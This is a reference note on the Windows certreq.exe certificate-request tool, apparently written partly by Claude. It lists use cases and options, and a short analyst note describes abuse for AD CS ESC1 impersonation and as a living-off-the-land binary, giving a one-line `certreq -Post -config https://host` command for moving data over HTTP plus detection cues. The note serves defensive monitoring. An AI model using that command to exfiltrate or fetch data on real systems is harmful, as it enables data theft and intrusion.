---
created: 2026-11-21
fullpath: 'C:\Windows\System32\certreq.exe'
generator:
  - claude
  - microsoftlearn
tags:
aliases:
  - certreq.exe
  - certreq
url:
  - https://learn.microsoft.com/windows-server/administration/windows-commands/certreq_1
---

**fullpath**:C:\Windows\System32\certreq.exe

# description

certreq is a built-in Windows command-line tool for working with certification authorities: it requests certificates, retrieves responses, creates requests from .inf policy files, accepts and installs issued certificates, and builds and signs cross-certification or qualified subordination requests. It is used with Active Directory Certificate Services (AD CS); related tools are certutil and the Certificates MMC snap-in.

## simple description

> ### 2026-11-21 Claude said
> Certreq is the Windows tool for asking a certificate authority for a certificate and installing the result. Admins write a small .inf file describing the certificate (subject, key length, template), create a request, submit it to the CA and accept the issued certificate. It can also create self-signed certificates and enroll directly from a certificate template. It works with both user and computer certificate stores.
>
> **SOC NOTE**: certreq can be abused for AD CS attacks, e.g. requesting certificates with an attacker-chosen SAN from a vulnerable template (ESC1) to impersonate privileged users (MITRE ATT&CK T1649 Steal or Forge Authentication Certificates). It is also a LOLBin: `certreq -Post -config https://host file` can upload or download data over HTTP (T1105 / T1048). Review CA logs (Events 4886/4887) and process command lines containing `-Post`, `-config http`, or `-new` with SAN extensions.
>

# purpose

Request certificates from a CA, retrieve responses to previous requests, create new requests from .inf files, accept and install responses, construct cross-certification or qualified subordination requests from existing CA certificates or requests, and sign such requests.

# typical use cases

| usage | description |
| --- | --- |
| `certreq -submit certrequest.req certnew.cer certnew.pfx` | Submit a basic certificate request. |
| `certreq -retrieve 20 MyCertificate.cer` | Retrieve certificate ID 20 into a .cer file. |
| `certreq -new requestconfig.inf certrequest.req` | Create a new request from an INF policy file. |
| `certreq -accept certnew.cer` | Accept and install an issued certificate. |
| `certreq -policy certsrv.req policy.inf newcertsrv.req` | Build a cross certificate request. |
| `certreq -sign myrequest.req myrequest.req` | Sign a request. |
| `certreq -enroll -machine -policyserver * WebServer` | Enroll a machine certificate using the WebServer template. |
| `certreq -enroll -machine -cert 61 2d 3c fe 00 00 00 00 00 05 renew` | Renew a certificate by serial number. |

# options

| option | description |
| --- | --- |
| `-submit` | Submits a request to a certificate authority (default action). |
| `-retrieve <requestid>` | Retrieves a response to a previous request from a certificate authority. |
| `-new` | Creates a new request from an .inf file. |
| `-accept` | Accepts and installs a response to a certificate request. |
| `-policy` | Sets the policy for a request. |
| `-sign` | Signs a cross-certification or qualified subordination request. |
| `-enroll` | Enrolls for or renews a certificate. |
| `-?` | Displays a list of certreq syntax, options, and descriptions. |
| `<parameter> -?` | Displays help for the parameter specified. |
| `-v -?` | Displays a verbose list of the certreq syntax, options, and descriptions. |
| `-any` | Force `ICertRequest::Submit` to determine encoding type. |
| `-attrib <attributestring>` | Name:Value string pairs, separated by `\n`. |
| `-binary` | Formats output files as binary instead of base64-encoded. |
| `-policyserver <policyserver>` | URI or unique ID of a Certificate Enrollment Policy web service; `-` to browse. |
| `-config <ConfigString>` | CA to use (`CAHostName\CAName`), an https enrollment URI, or `-` for the local machine store CA. |
| `-anonymous` | Use anonymous credentials for Certificate Enrollment web services. |
| `-kerberos` | Use Kerberos (domain) credentials for Certificate Enrollment web services. |
| `-clientcertificate <ClientCertId>` | Client certificate by thumbprint, CN, EKU, template, email, UPN or `name=value`. |
| `-username <username>` | SAM name or domain\user for Certificate Enrollment web services; used with `-p`. |
| `-p <password>` | User's password for Certificate Enrollment web services; used with `-username`. |
| `-user` | User context for a new request or acceptance (default). |
| `-machine` | Machine context for a new request or acceptance; must match MachineKeySet and the template. |
| `-crl` | Includes CRLs in the base64-encoded PKCS #7 or request output file. |
| `-rpc` | Use an RPC server connection to AD CS instead of DCOM. |
| `-adminforcemachine` | Submit the request from Local System context via Key Service or impersonation; requires local admin. |
| `-renewonbehalfof` | Submit a renewal on behalf of the subject in the signing certificate (sets CR_IN_ROBO). |
| `-f` | Force existing files to be overwritten; bypasses caching templates and policy. |
| `-q` | Silent mode; suppress all interactive prompts. |
| `-unicode` | Writes Unicode output when standard output is redirected or piped. |
| `-unicodetext` | Sends Unicode output when writing base64 text encoded data blobs to files. |
